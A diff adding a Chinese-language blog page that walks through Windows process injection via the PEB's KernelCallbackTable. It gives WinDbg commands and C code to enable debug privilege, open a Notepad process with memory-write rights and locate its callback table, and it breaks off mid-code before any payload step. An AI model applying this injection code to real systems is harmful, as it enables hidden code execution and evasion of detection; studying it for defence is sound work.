@@ -1,0 +1,1345 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/dog2.jpg">
+  <link rel="icon" href="/img/dog2.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Jentle">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="目录[toc]  介绍攻击者可以劫持进程环境块 （PEB） 中的内核回调表，以重定向进程的执行流，从而使他们能够执行恶意负载。此方法允许攻击者通过将合法函数指针替换为恶意函数指针（通常由 Windows 消息触发）来保持持久性。 这种方法被 MITRE 认定为劫持执行流程和持久性技术，已被 FinFisher&#x2F;FinSpy 和 Lazarus 等威胁组织使用。 在这篇博客中，我们将探讨">
+<meta property="og:type" content="article">
+<meta property="og:title" content="使用内核回调表进程注入">
+<meta property="og:url" content="http://example.com/2024/11/12/%E4%BD%BF%E7%94%A8%E5%86%85%E6%A0%B8%E5%9B%9E%E8%B0%83%E8%A1%A8%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="TIPFactory">
+<meta property="og:description" content="目录[toc]  介绍攻击者可以劫持进程环境块 （PEB） 中的内核回调表，以重定向进程的执行流，从而使他们能够执行恶意负载。此方法允许攻击者通过将合法函数指针替换为恶意函数指针（通常由 Windows 消息触发）来保持持久性。 这种方法被 MITRE 认定为劫持执行流程和持久性技术，已被 FinFisher&#x2F;FinSpy 和 Lazarus 等威胁组织使用。 在这篇博客中，我们将探讨">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2024/11/12/%E4%BD%BF%E7%94%A8%E5%86%85%E6%A0%B8%E5%9B%9E%E8%B0%83%E8%A1%A8%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/POC.png">
+<meta property="og:image" content="http://example.com/2024/11/12/%E4%BD%BF%E7%94%A8%E5%86%85%E6%A0%B8%E5%9B%9E%E8%B0%83%E8%A1%A8%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/image.png">
+<meta property="article:published_time" content="2024-11-12T08:55:48.000Z">
+<meta property="article:modified_time" content="2025-10-23T01:07:21.053Z">
+<meta property="article:author" content="Jentle">
+<meta property="article:tag" content="主机安全">
+<meta property="article:tag" content="进程注入">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2024/11/12/%E4%BD%BF%E7%94%A8%E5%86%85%E6%A0%B8%E5%9B%9E%E8%B0%83%E8%A1%A8%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/POC.png">
+  
+  
+  
+  <title>使用内核回调表进程注入 - TIPFactory</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":50,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":1},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="TIPFactory" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>TIPFactory</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="使用内核回调表进程注入"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-11-12 16:55" pubdate>
+          November 12, 2024 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.1k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          43 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">使用内核回调表进程注入</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" srcset="/img/loading.gif" lazyload data-original="/2024/11/12/%E4%BD%BF%E7%94%A8%E5%86%85%E6%A0%B8%E5%9B%9E%E8%B0%83%E8%A1%A8%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/POC.png" alt="POC"></p>
+<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>[toc]</p>
+<hr>
+<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>攻击者可以劫持进程环境块 （PEB） 中的内核回调表，以重定向进程的执行流，从而使他们能够执行恶意负载。此方法允许攻击者通过将合法函数指针替换为恶意函数指针（通常由 Windows 消息触发）来保持持久性。</p>
+<p>这种方法被 MITRE 认定为劫持执行流程和持久性技术，已被 FinFisher&#x2F;FinSpy 和 Lazarus 等威胁组织使用。</p>
+<p>在这篇博客中，我们将探讨 PEB，如何操作 Kernel Callback Table，以及如何将这种技术应用于进程注入，以在目标进程中秘密执行代码。</p>
+<hr>
+<h2 id="参考-PoC"><a href="#参考-PoC" class="headerlink" title="参考 PoC"></a>参考 PoC</h2><p>链接 -&gt; <a target="_blank" rel="noopener" href="https://github.com/0xHossam/KernelCallbackTable-Injection-PoC">https://github.com/0xHossam/KernelCallbackTable-Injection-PoC</a></p>
+<hr>
+<h2 id="了解过程环境块-（PEB）"><a href="#了解过程环境块-（PEB）" class="headerlink" title="了解过程环境块 （PEB）"></a>了解过程环境块 （PEB）</h2><p>进程环境块 （PEB） 是 Windows 中每个正在运行的程序都依赖的关键结构。将其视为“控制中心”或“中心”，其中包含有关程序如何运行以及与系统交互的基本信息。PEB 是进程内存空间的一部分，它可以帮助操作系统和程序管理各种内部细节。</p>
+<p>PEB 存储重要数据，例如：</p>
+<ul>
+<li><p>加载的模块 - 这些是程序运行所需的动态链接库 （DLL） 或外部库。例如，程序通常依赖于 kernel32.dll 或 user32.dll 等系统库提供的其他代码，并且 PEB 会在加载这些库后对其进行跟踪。</p>
+</li>
+<li><p>堆信息 - PEB 的此部分包含有关程序内存管理的信息。“堆” 是程序在其中存储运行时所需数据的内存区域。PEB 有助于管理和监控此内存的使用情况，从而跟踪分配和释放。</p>
+</li>
+<li><p>进程开始时间 - PEB 还存储进程的创建时间，这对于了解程序的运行时间非常有用。</p>
+</li>
+<li><p>线程信息 - 每个程序都通过“线程”运行任务或操作，PEB 包含有关这些线程的数据。这有助于操作系统管理程序同时运行的不同任务。</p>
+</li>
+<li><p>进程标志和设置 - PEB 包含描述进程行为方式的标志和配置数据。这可能包括安全设置、用于调试的特殊标志，甚至进程是否作为另一个进程的子系统运行。</p>
+</li>
+<li><p>内存布局信息 - PEB 还保存有关进程内存布局的数据，例如程序代码、数据和资源的不同部分在内存中的位置。</p>
+</li>
+</ul>
+<hr>
+<h2 id="浏览内核回调表"><a href="#浏览内核回调表" class="headerlink" title="浏览内核回调表"></a>浏览内核回调表</h2><p>PEB 中是内核回调表，这是在user32.dll加载到图形用户界面 （GUI） 进程时初始化的函数指针数组。此表包含指向处理窗口消息和其他进程间通信的各种回调函数的指针。此表中的每个函数都对应于特定任务，例如处理数据传输消息或管理窗口销毁事件。</p>
+<p>例如，调用 Kernel Callback Table 中的 __fnCOPYDATA 函数以响应 WM_COPYDATA 窗口消息。此功能有助于在应用程序之间传输数据，允许一个进程将数据无缝发送到另一个进程。通过了解 Kernel Callback Table 中每个函数的结构和用途，我们可以理解进程如何交互和处理各种系统事件。</p>
+<hr>
+<h2 id="查找和分析内核回调表"><a href="#查找和分析内核回调表" class="headerlink" title="查找和分析内核回调表"></a>查找和分析内核回调表</h2><p>内核回调表是 Windows 上 GUI 进程的进程环境块 （PEB） 中的关键结构。攻击者可以修改此表，通过将特定函数指针重定向到恶意负载来劫持进程的执行流。本指南提供了在 WinDbg 中查找和分析内核回调表并了解其在进程注入中的作用的分步说明。</p>
+<h3 id="查找-PEB-和内核回调表"><a href="#查找-PEB-和内核回调表" class="headerlink" title="查找 PEB 和内核回调表"></a>查找 PEB 和内核回调表</h3><ol>
+<li><strong>识别 PEB 结构</strong></li>
+</ol>
+<ul>
+<li><p>可以在 WinDbg 中使用 dt 命令浏览 PEB，该命令显示有关结构的详细信息。KernelCallbackTable 通常位于 PEB 中 +0x058 的偏移量处。</p>
+</li>
+<li><p>在 WinDbg 中使用以下命令：</p>
+<p>dt ntdll！PEB系列</p>
+</li>
+<li><p>这将显示 PEB 结构及其字段，包括偏移量 +0x058 处的 KernelCallbackTable，显示 Kernel Callback Table 指针所在的位置。</p>
+<p><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" srcset="/img/loading.gif" lazyload data-original="/2024/11/12/%E4%BD%BF%E7%94%A8%E5%86%85%E6%A0%B8%E5%9B%9E%E8%B0%83%E8%A1%A8%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/image.png" alt="PEB structure"></p>
+</li>
+</ul>
+<ol start="2">
+<li><strong>找到内核回调表地址</strong></li>
+</ol>
+<ul>
+<li><p>识别出 PEB 中的 KernelCallbackTable 字段后，通过访问该字段直接找到其地址：</p>
+<pre><code class="hljs">dt ntdll!PEB @$peb.KernelCallbackTable
+</code></pre>
+</li>
+<li><p>此命令提供 PEB 中内核回调表的特定地址，该地址包含函数指针数组。</p>
+</li>
+</ul>
+<ol start="3">
+<li><strong>检查内核回调表内容</strong></li>
+</ol>
+<ul>
+<li><p>获取内核回调表的地址后，使用 dqs 命令在 WinDbg 中显示其内容。此命令显示从指定地址开始的每个四字（64 位条目），并显示表中的回调函数指针。</p>
+<p>DQS 0x00007ffa’29123070 L60</p>
+</li>
+<li><p>此命令显示 Kernel Callback Table 中的前 60 个四字（480 字节），允许您直接检查回调函数地址。</p>
+</li>
+</ul>
+<h3 id="分析-Kernel-Callback-Table-中的函数指针"><a href="#分析-Kernel-Callback-Table-中的函数指针" class="headerlink" title="分析 Kernel Callback Table 中的函数指针"></a>分析 Kernel Callback Table 中的函数指针</h3><p>在内核回调表中，每个条目对应于一个指向回调函数的指针，当收到特定 Windows 消息时，进程可以调用该函数。某些函数指针（如 __fnCOPYDATA）特别有趣，因为它们通过消息（如 WM_COPYDATA）处理数据传输。通过识别和分析这些指针，您可以了解流程如何处理某些事件。</p>
+<ol>
+<li><strong>确定 __fnCOPYDATA 条目</strong></li>
+</ol>
+<ul>
+<li><p>__fnCOPYDATA 函数通常用于注入技术中，因为它可以通过WM_COPYDATA消息触发，从而允许在进程之间传递数据。</p>
+</li>
+<li><p>将 dqs 命令与 Kernel Callback Table 的基址一起使用，以列出特定的函数指针，包括 __fnCOPYDATA。</p>
+<p>DQS 0x00007ffa’29123070 L10</p>
+</li>
+<li><p>输出示例：</p>
+<pre><code class="hljs">00007ffa`29123070  00007ffa`290c2bd0 user32!_fnCOPYDATA
+00007ffa`29123078  00007ffa`2911ae70 user32!_fnCOPYGLOBALDATA
+00007ffa`29123080  00007ffa`290c0420 user32!_fnDWORD
+...
+</code></pre>
+</li>
+<li><p>每个条目对应于 Kernel Callback Table 中的一个函数指针。此处，user32！_fnCOPYDATA 显示了 __fnCOPYDATA 的地址，在处理 WM_COPYDATA 消息时，可以重定向该地址以执行自定义代码。</p>
+</li>
+</ul>
+<hr>
+<h2 id="通过内核回调表操作进行进程注入"><a href="#通过内核回调表操作进行进程注入" class="headerlink" title="通过内核回调表操作进行进程注入"></a>通过内核回调表操作进行进程注入</h2><p>攻击者可以操纵进程的 Kernel Callback Table 来劫持其执行流，迫使其运行注入的代码。内核回调表是进程的进程环境块 （PEB） 中的函数指针数组，当user32.dll加载到任何图形用户界面 （GUI） 进程中时，其中填充了回调函数。这些回调函数支持系统和进程之间的通信，从而允许进程响应特定的 Windows 消息。</p>
+<p>要使用 Kernel Callback Table 劫持执行流，攻击者可以将一个或多个原始回调函数指针替换为指向恶意代码的指针。此方法提供了一种将执行从合法回调重定向到注入的有效负载的方法。修改这些函数指针通常是通过使用 Reflective Code Loading 或 Process Injection 来实现的。例如，攻击者可以通过 NtQueryInformationProcess 函数（一种公开进程内部的低级别 Windows API 调用）检索 PEB 地址来找到内核回调表。找到 PEB 后，攻击者即可获得对内核回调表的访问权限，并可以继续将回调函数指针（如 __fnCOPYDATA）替换为恶意负载的地址。</p>
+<p>进行此修改后，可以更新 PEB 以引用更改后的内核回调表，该表现在包含注入的有效负载。恶意函数通常在将特定 Windows 消息发送到目标进程时触发，从而激活更改的回调函数，从而激活注入的有效负载。由于此操作发生在目标进程的内存中，因此它通过掩盖合法进程下有效负载的执行来有效地逃避检测。</p>
+<p>一旦执行被劫持并执行有效负载，高级攻击者可能会将原始内核回调表恢复到其合法状态，以进一步逃避检测。</p>
+<h3 id="步骤-1-启用调试权限"><a href="#步骤-1-启用调试权限" class="headerlink" title="步骤 1 - 启用调试权限"></a>步骤 1 - 启用调试权限</h3><p>在一个进程可以操纵另一个进程的内存之前，出于测试目的，我需要启用一些调试权限。调试权限允许当前进程访问其他进程的敏感区域，这些区域对于内存读取和写入等任务是必需的。如果没有这些权限，Windows 安全性将限制对其他进程的访问，从而无法注入。</p>
+<p>EnableDebugPrivilege 函数通过修改当前进程的令牌以启用 SE_DEBUG_NAME 权限来提升权限。</p>
+<pre><code class="hljs">void EnableDebugPrivilege() &#123;
+
+    printf( &quot;[*] Enabling Debug Privilege...\n&quot; );
+    HANDLE hToken;
+    TOKEN_PRIVILEGES tkp;
+    if ( OpenProcessToken( GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken ) ) &#123;
+        LookupPrivilegeValue( NULL, SE_DEBUG_NAME, &amp;tkp.Privileges[ 0 ].Luid );
+        tkp.PrivilegeCount = 1;
+        tkp.Privileges[ 0 ].Attributes = SE_PRIVILEGE_ENABLED;
+        AdjustTokenPrivileges( hToken, FALSE, &amp;tkp, sizeof( tkp ), NULL, NULL );
+        CloseHandle( hToken );
+    &#125; else &#123;
+        printf( &quot;[-] Failed to enable Debug Privilege.\n&quot; );
+    &#125;
+
+&#125;
+</code></pre>
+<p><strong>详细说明</strong></p>
+<ol>
+<li>OpenProcessToken 打开当前进程的访问令牌的句柄，该令牌拥有安全权限。</li>
+<li>LookupPrivilegeValue 检索权限 SE_DEBUG_NAME 的本地唯一标识符 （LUID），该标识符授予进程调试功能。</li>
+<li>AdjustTokenPrivileges 在令牌中设置权限以启用调试权限，从而允许进程对其他进程执行内存操作。</li>
+</ol>
+<h3 id="步骤-2-加载-NtQueryInformationProcess"><a href="#步骤-2-加载-NtQueryInformationProcess" class="headerlink" title="步骤 2 - 加载 NtQueryInformationProcess"></a>步骤 2 - 加载 NtQueryInformationProcess</h3><p>ntdll.dll 的 NtQueryInformationProcess 函数是一个低级别 Windows API 函数，它提供对有关进程的特定信息的访问，包括进程环境块 （PEB）。PEB 包含内核回调表等结构，该表存储指向各种回调函数的指针。此函数必须动态加载，因为它通常无法通过标准 Windows 标头访问。</p>
+<pre><code class="hljs">typedef NTSTATUS( NTAPI* pNtQueryInformationProcess )( HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG );
+void LoadNtQueryInformationProcess( pNtQueryInformationProcess &amp;NtQueryInformationProcess ) &#123;
+    printf( &quot;[*] Loading NtQueryInformationProcess...\n&quot; );
+    HMODULE hNtdll = GetModuleHandleA( &quot;ntdll.dll&quot; );
+    if ( hNtdll ) &#123;
+        NtQueryInformationProcess = ( pNtQueryInformationProcess ) GetProcAddress( hNtdll, &quot;NtQueryInformationProcess&quot; );
+        if ( NtQueryInformationProcess ) &#123;
+            printf( &quot;[+] NtQueryInformationProcess loaded successfully at address: 0x%p\n&quot;, NtQueryInformationProcess );
+        &#125; else &#123;
+            printf( &quot;[-] Failed to resolve NtQueryInformationProcess address.\n&quot; );
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p><strong>详细说明</strong></p>
+<ul>
+<li>GetModuleHandle 会将ntdll.dll加载到进程中，从而访问其函数。</li>
+<li>GetProcAddress 检索 NtQueryInformationProcess 的地址，以便稍后调用此函数以收集有关目标进程的详细信息。</li>
+</ul>
+<h3 id="步骤-3-—-启动-Target-流程"><a href="#步骤-3-—-启动-Target-流程" class="headerlink" title="步骤 3 — 启动 Target 流程"></a>步骤 3 — 启动 Target 流程</h3><p>进程注入首先创建一个 Notepad 实例，该实例将用作注入代码的目标。此示例使用 Notepad，因为它是一个简单、众所周知的应用程序，允许对注射过程进行受控测试。</p>
+<pre><code class="hljs">STARTUPINFO si = &#123; sizeof( si ) &#125;;
+PROCESS_INFORMATION pi;
+
+printf( &quot;[*] Creating new Notepad process...\n&quot; );
+if ( !CreateProcess( L&quot;C:\\Windows\\System32\\notepad.exe&quot;, NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &amp;si, &amp;pi ) ) &#123;
+    printf( &quot;[-] Failed to create Notepad process. Error: %d\n&quot;, GetLastError() );
+    return -1;
+&#125;
+printf( &quot;[+] Notepad process created successfully. PID: %d\n&quot;, pi.dwProcessId );
+</code></pre>
+<p><strong>详细说明</strong></p>
+<ul>
+<li>CreateProcess 在新控制台中启动记事本，并将进程信息存储在 pi 中。生成的进程 ID （pi.dwProcessId） 是必不可少的，因为它标识了记事本进程，以便进行后续的内存操作。</li>
+</ul>
+<h3 id="第-4-步-—-找到目标窗口和进程-ID"><a href="#第-4-步-—-找到目标窗口和进程-ID" class="headerlink" title="第 4 步 — 找到目标窗口和进程 ID"></a>第 4 步 — 找到目标窗口和进程 ID</h3><p>该代码找到记事本的窗口句柄并检索其进程 ID。此句柄提供与 Notepad 的连接，从而可以打开句柄来操作其内存。</p>
+<pre><code class="hljs">HWND hWindow = NULL;
+DWORD waitTime = 0;
+const DWORD MAX_WAIT_TIME = 10000;
+
+while ( hWindow == NULL &amp;&amp; waitTime &lt; MAX_WAIT_TIME ) &#123;
+    hWindow = FindWindow( L&quot;Notepad&quot;, NULL );
+    if ( !hWindow ) &#123;
+        Sleep( 500 );
+        waitTime += 500;
+    &#125;
+&#125;
+if ( !hWindow ) &#123;
+    printf( &quot;[-] Failed to find Notepad window handle after waiting for %d milliseconds.\n&quot;, MAX_WAIT_TIME );
+    TerminateProcess( pi.hProcess, 0 );
+    CloseHandle( pi.hProcess );
+    CloseHandle( pi.hThread );
+    return -1;
+&#125;
+printf( &quot;[+] Window Handle found: 0x%p\n&quot;, hWindow );
+
+DWORD pid;
+GetWindowThreadProcessId( hWindow, &amp;pid );
+printf( &quot;[+] Process ID: %d\n&quot;, pid );
+</code></pre>
+<p><strong>详细说明</strong></p>
+<ul>
+<li>FindWindow 按名称搜索记事本的 window 类并找到其句柄。如果找到句柄，GetWindowThreadProcessId 将检索关联的进程 ID。</li>
+<li>此进程 ID 对于打开句柄以直接访问 Notepad 的内存是必需的。</li>
+</ul>
+<h3 id="第-5-步-打开目标进程的句柄"><a href="#第-5-步-打开目标进程的句柄" class="headerlink" title="第 5 步 - 打开目标进程的句柄"></a>第 5 步 - 打开目标进程的句柄</h3><p>使用进程 ID，代码将打开记事本的句柄。此句柄允许直接访问进程的内存，这对于注入至关重要。</p>
+<pre><code class="hljs">HANDLE hProcess = OpenProcess( PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid );
+if ( !hProcess ) &#123;
+    printf( &quot;[-] Failed to open target process. Error: %d\n&quot;, GetLastError() );
+    return -1;
+&#125;
+printf( &quot;[+] Process Handle: 0x%p\n&quot;, hProcess );
+</code></pre>
+<p><strong>详细说明</strong></p>
+<ul>
+<li>OpenProcess 打开一个具有内存读取、写入和查询操作权限的句柄，允许注入器与记事本的内存交互。</li>
+</ul>
+<h3 id="步骤-6-检索-PEB-地址"><a href="#步骤-6-检索-PEB-地址" class="headerlink" title="步骤 6 - 检索 PEB 地址"></a>步骤 6 - 检索 PEB 地址</h3><p>NtQueryInformationProcess 用于检索目标进程的 PEB 地址。PEB 包含 Kernel Callback Table，这是此注入技术中修改的重点。</p>
+<pre><code class="hljs">PROCESS_BASIC_INFORMATION pbi;
+ULONG returnLength;
+NTSTATUS status = NtQueryInformationProcess( hProcess, ProcessBasicInformation, &amp;pbi, sizeof( pbi ), &amp;returnLength );
+if ( status != 0 ) &#123;
+    printf( &quot;[-] Failed to query process information. NTSTATUS: 0x%lx\n&quot;, status );
+    return -1;
+&#125;
+PVOID PebBaseAddress = pbi.PebBaseAddress;
+printf( &quot;[*] PEB Address: 0x%p\n&quot;, PebBaseAddress );
+</code></pre>
+<p><strong>详细说明</strong></p>
+<ul>
+<li>NtQueryInformationProcess 填充 PROCESS_BASIC_INFORMATION 结构（包括 PebBaseAddress），从而提供对 PEB 的访问权限，以便进一步操作内核回调表。</li>
+</ul>
+<h3 id="第-7-步-读取内核回调表"><a href="#第-7-步-读取内核回调表" class="headerlink" title="第 7 步 - 读取内核回调表"></a>第 7 步 - 读取内核回调表</h3><p>使用 PEB 地址，代码读取 Kernel Callback Table 的内存地址，从而允许修改此表中的函数指针以控制回调。</p>
+<pre><code class="hljs">PVOID KernelCallbackTable;
+SIZE_T bytesRead = 0;
